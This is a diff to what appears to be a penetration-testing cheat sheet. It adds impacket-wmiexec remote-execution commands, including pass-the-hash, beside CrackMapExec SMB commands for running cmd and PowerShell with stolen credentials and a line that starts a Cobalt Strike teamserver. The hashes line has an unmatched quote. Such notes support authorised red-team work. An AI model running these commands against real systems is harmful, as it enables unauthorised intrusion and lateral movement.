@@ -39,6 +39,11 @@ cme smb -u <username> -p <password> -d <domain> <IP> --loggedon-users
 cme smb -u <username> -p <password> -d <domain> <IP> -x '<cmd command>'
 cme smb -u <username> -p <password> -d <domain> <IP> -X '<powershell command>'
 
+**Remote Access**
+------------------
+impacket-wmiexec <domain>/<user>:<password>@<IP>
+impacket-wmiexec <domain>/<user>@<IP> -hashes ":<hash>
+
 **CS**
 --------------------
 - ./teamserver <ip> <password> 2019-MM-DD /path/to/C2/c2.profile
